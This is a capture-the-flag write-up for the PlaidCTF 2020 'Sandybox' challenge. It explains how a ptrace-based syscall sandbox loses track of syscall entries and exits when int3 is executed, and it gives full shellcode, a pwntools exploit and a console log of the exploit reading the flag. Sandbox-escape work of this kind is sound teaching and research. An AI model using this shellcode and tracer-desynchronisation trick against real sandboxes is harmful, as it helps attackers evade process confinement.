# Sandybox (sandbox, ptrace, int3)

This was the lowest scored pwn challenge in PlaidCTF 2020, but still very interesting one! In this challenge we have an example of sandbox implemented using `ptrace`. If you havn't solved the challenge – I strongly encourage you to watch a great presentation by Robert Swiecki [Escaping the (sand)box](https://www.youtube.com/watch?v=gJpaxisyQfY) and give it one more try:)

Note that there are multiple ways of solving this challenge. If I mention that some particular operation is not interesting it means that it is no interesting for my exploitation path:)

## Source
Challenge creators provided us with binary. I have to say that I hate when pwn creators don't give the source code to participants. Especially when reversing part is not challenging, but just takes time.
But back to the challenge. The reversing part was rather simple as the binary was small in size. You can check the full pseudocode [here](source.c).

## Flow
The very simplified flow is as follows:
1) Program does have some `rlimits` limitations, restricting the cpu usage, file sizes and numer of processes. Nothing interesting.
2) Then the `fork` is being invoked. The child is going to be sandboxed and the parent is going to be the supervisor. 
3 – child) [Child] The child calls `ptrace` with `PTRACE_TRACEME` flag, stops and waits for parent to start tracing it.
3 – parent) [Parent] The parent starts tracing the child. In infinite loop he waits for the child to invoke syscall, then it checks if it should allow the syscall or block it. And again till the child dies, exits or timeouts.
4) [Child] Child mmaps a region, reads 10 bytes of shellcode from user to this region and finaly jumps to it.

## 10 Bytes
So it seemed that we have only 10 bytes to play with. I knew that I need some more space as I'm not a master at assembly. So first thing I wanted to focus on was to be able to execute more then 10 bytes.

This is how the child reads and then jump to shellcode:

```c
int exec_shellcode()
{
    char *code, *code_ptr;

    syscall(__NR_alarm, 20);

    code = mmap(NULL, 10, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); // 1 <-- allocate some executable memory
    printf("> ");
    code_ptr = code;
    do // <-- read shellcode byte by byte
    {
        if (read(0, code_ptr, 1) != 1)
        {
            exit(0);
        }
        code_ptr += 1;
    } while (code_ptr != code + 10);

    (*code)(); // 3 <-- jump to shellcode
    return 0;
}
```

So the first think to notice is that mmap never allocates less then PAGE_SIZE. So there has been allocated at least 4096 bytes of executable memory.

Secondly, when sandboxed process jumps to our shellcode the `$rsi` is already set to code + 10. This means that we can make our shellcode just call `read` again to load some longer shellcode!

So the 10 bytes of shellcode look like this:

```python3
shellcode = asm('''
push 1000
pop rdx
xor eax, eax
syscall
''', arch='amd64')
```

and are only supposed to load the rest of shellcode which can be up to 1000 bytes long:)

## Filter
So can we now just open and read the flag? Unfortunately no. Every time the sandboxed process invokes syscall, the tracer checks the register state of the tracee and decides whether or not the syscall should be allowed:

```c
void check_syscall(pid_t child_pid, struct user_regs_struct *regs)
{
    char pathname_part0[8];
    char pathname_part1[8];

    if (regs.orig_rax == __NR_lseek || regs.orig_rax == __NR_read ||
        regs.orig_rax == __NR_write || regs.orig_rax == __NR_close ||
        regs.orig_rax == __NR_fstat || regs.orig_rax == __NR_exit ||
        regs.orig_rax == __NR_exit_group || regs.orig_rax == __NR_getpid)
        return 0;

    if (regs.orig_rax == __NR_alarm)
    {
        /* Allow only short alarms. */
        return regs.rdi > 20;
    }

    if (regs.orig_rax == __NR_munmap ||
        regs.orig_rax == __NR_mprotect ||
        regs.orig_rax == __NR_mmap)
    {
        return regs.rsi <= 0x1000;
    }

    if (regs.orig_rax == __NR_open)
    {
        /* Flags must be O_RDONLY. */
        if (regs.rsi != 0)
            return 1;

        pathname_part0 = ptrace(PTRACE_PEEKDATA, child_pid, regs.rdi, 0);
        pathname_part1 = ptrace(PTRACE_PEEKDATA, child_pid, regs.rdi + 8, 0);
        // TODO some extra checks. For example whether the path contains a "flag" string in it.
    }

    return 1;
}
```

I havn't reversed the whole function, especialy the check for `sys_open`. But the simple `open('flag', O_RDONLY, 0)` doesn't work as the tracer blacklists the `flag` word in the pathname (I believe it does it wrong and there is a way to bypass this check – but I've picked other way). 


## Ptrace doesn't work
Robert Sowiecki explained very well why `ptrace` should not be used to sandboxing. First thing he pointed out is that tracer must keep track of entries and exits from syscall as the `ptrace` itself doesn't really tells the user whether the process has just exited or entered the syscall. 

And guess what – the challenge program doesn't keep track of those entries and exits correctly:) 

Let's see the <b>simplified</b> main loop of the supervisor.

```c
// simplified main tracer loop
while (1) {
    // wait for a syscall entry
    ptrace(PTRACE_SYSCALL, child_pid, 0);
    waitpid(child_pid, &status, __WALL);
    
    ptrace(PTRACE_GETREGS, child_pid, 0, regs);
    if (check_syscall(child_pid, regs)) {
        // ALLOW SYSCALL
    } else {
        // BLOCK SYSCALL
    }

    // wait for a syscall exit
    ptrace(PTRACE_SYSCALL, child_pid, 0, 0);
    waitpid(child_pid, &status, __WALL);
}
```

As you can see, the program waits for a syscall entry and syscall exit in the same maner. This is of course not the sandbox programer fault, but it is the design. According to [man](http://man7.org/linux/man-pages/man2/ptrace.2.html) page:

```
PTRACE_SYSCALL, PTRACE_SINGLESTEP
    Restart the stopped tracee as for PTRACE_CONT, but arrange for
    the tracee to be stopped at the next entry to or exit from a
    system call, or after execution of a single instruction,
    respectively.  (The tracee will also, as usual, be stopped
    upon receipt of a signal.)  From the tracer's perspective, the
    tracee will appear to have been stopped by receipt of a SIG‐
    TRAP.  So, for PTRACE_SYSCALL, for example, the idea is to
    inspect the arguments to the system call at the first stop,
    then do another PTRACE_SYSCALL and inspect the return value of
    the system call at the second stop.  The data argument is
    treated as for PTRACE_CONT.  (addr is ignored.)
```

But what if we trick the tracer and make the loop look like this:

```c
// simplified main tracer faked loop
while (1) {
    // wait for a syscall exit
    ptrace(PTRACE_SYSCALL, child_pid, 0);
    waitpid(child_pid, &status, __WALL);
    
    ptrace(PTRACE_GETREGS, child_pid, 0, regs);
    if (check_syscall(child_pid, regs)) {
        // ALLOW SYSCALL
    } else {
        // BLOCK SYSCALL
    }

    // wait for a syscall entry
    ptrace(PTRACE_SYSCALL, child_pid, 0, 0);
    waitpid(child_pid, &status, __WALL);
}
```

So now the tracer will be checking the registers on exit to syscall. What of course makes no sense:) But how can we make the tracer loose track of those entries/exits? There is a well known trick using `int3` instruction! It will wake the parent which will think the syscall has been invoked, but in fact there was no syscall just interupt. And so we just inverted the loop:)

And after we are free to just open and read a flag file.
Our exploit is super short:)


```python3
# First 10 bytes of shellcode, used only to load the rest of the shellcode
shellcode = asm('''
push 1000
pop rdx
xor eax, eax
syscall
''', arch='amd64')

# Some nops to be sure there is no SIGSEV
# Invoke int3 to invert the main tracer loop
shellcode += asm('''
nop
nop
nop
nop
nop
nop
nop
mov rax, 8
int3
''', arch='amd64')

# And now just read the flag file :)
shellcode += asm(shellcraft.amd64.cat('flag'), arch='amd64')
```


## POC:

```console
$ sudo python3 exp.py REMOTE
[sudo] password for k: 
[*] '/home/k/sandboxy/sandybox'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
[+] Opening connection to sandybox.pwni.ng on port 1337: Done
10
[DEBUG] Sent 0x3b bytes:
    00000000  68 e8 03 00  00 5a 31 c0  0f 05 90 90  90 90 90 90  │h···│·Z1·│····│····│
    00000010  90 48 c7 c0  08 00 00 00  cc 68 66 6c  61 67 6a 02  │·H··│····│·hfl│agj·│
    00000020  58 48 89 e7  31 f6 99 0f  05 41 ba ff  ff ff 7f 48  │XH··│1···│·A··│···H│
    00000030  89 c6 6a 28  58 6a 01 5f  99 0f 05                  │··j(│Xj·_│···│
    0000003b
[+] Receiving all data: Done (84B)
[DEBUG] Received 0x6 bytes:
    b'o hai\n'
[DEBUG] Received 0x4e bytes:
    b'> PCTF{bonus_round:_did_you_spot_the_other_2_solutions?}\n'
    b'so long, sucker 0x8b\n'
[*] Closed connection to sandybox.pwni.ng port 1337
```